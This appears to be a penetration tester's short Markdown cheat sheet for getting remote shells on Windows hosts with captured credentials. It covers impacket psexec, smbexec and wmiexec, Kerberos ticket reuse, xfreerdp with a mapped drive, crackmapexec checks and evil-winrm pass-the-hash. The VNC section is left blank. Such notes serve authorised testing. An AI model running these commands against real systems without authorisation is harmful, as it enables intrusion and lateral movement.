# Remote Shell
## SMB & RPC: 445, 135
`impacket-psexec '<DOMAIN>/<USER>:<PASS>@<IP>'`
`impacket-smbexec '<DOMAIN>/<USER>:<PASS>@<IP>'`
`impacket-wmiexec '<DOMAIN>/<USER>:<PASS>@<IP>'`
`KRB5CCNAME='<CCACHE>' python3 ~/Desktop/OPSEC/tools/impacket/examples/smbexec.py -k -no-pass <DOMAIN>/<USER>@<TARGET>`

## RDP: 3389
`impacket-rdp_check '<DOMAIN>/<USER>:<PASS>@<IP>'` check
 `xfreerdp /v:<IP> /u:DOMAIN\<USER> /p:<PASS> /dynamic-resolution /drive:share,/tmp`
 /cert:ignore
 +clipboard
`remmina`

## WinRM: 5985, 5986
`crackmapexec winrm <IP> -u <USER> -p <PASS>` check
`evil-winrm -i <IP> -u <USER> -p <PASS>` (PtH)

## VNC
??